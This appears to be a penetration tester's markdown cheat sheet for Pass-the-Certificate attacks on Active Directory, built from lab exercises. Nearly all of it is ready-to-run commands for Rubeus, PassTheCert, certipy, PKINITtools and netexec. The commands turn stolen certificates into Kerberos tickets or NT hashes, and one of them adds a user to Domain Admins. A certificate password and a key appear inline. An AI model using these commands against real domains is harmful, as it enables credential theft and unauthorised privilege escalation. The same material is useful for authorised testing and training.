- [ ] PTC From Windows
- [ ] PTC From Linux
- [ ] No PKINIT

PTC From Windows!!!
```powershell
Rubeus.exe asktgt /user:"TARGET_SAMNAME" /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show


.\PassTheCert.exe --server fqdn.domain.local --cert-path Z:\cert.pfx --add-account-to-group --target "CN=Domain Admins,CN=Users,DC=domain,DC=local" --account "CN=simple_user,CN=Users,DC=domain,DC=local"
```
PTC From Linux!!!
```sh
# certipy
certipy auth -pfx /home/kali/htb/academy/cptspath/exploitation/dc01.pfx -dc-ip 10.129.234.174
# gettgtpkinit.py
python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
# getnthash.py
export KRB5CCNAME=./dd.ccache
python3 getnthash.py outdated.htb/sflowers -key de917db96eaa8cb01fb5f98ac9b2111b9dac3972a7cf8b4e33b492b2caccf0ea
# netexec
netexec <proto> <ip> --pfx-cert "PATH_TO_PFX_CERT" -u user 
netexec <proto> <ip> --pfx-cert "PATH_TO_PFX_CERT" --pfx-pass "CERT_PASSWORD" -u user 
netexec <proto> <ip> --pfx-base64 "PATH_TO_PFX_CERT" -u user 
netexec <proto> <ip> --pem-cert "PATH_TO_CRT" --pem-key "PATH_TO_KEY" -u user
```
No PKINIT!!!
```
https://github.com/AlmondOffSec/PassTheCert

.\PassTheCert.exe --server fqdn.domain.local --cert-path Z:\cert.pfx --add-account-to-group --target "CN=Domain Admins,CN=Users,DC=domain,DC=local" --account "CN=simple_user,CN=Users,DC=domain,DC=local"
```
References!!!
[Authentiting with certificate when PKINIT is not Supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
[adcs esc8](https://www.hackingarticles.in/adcs-esc8-ntlm-relay-to-ad-cs-http-endpoints/)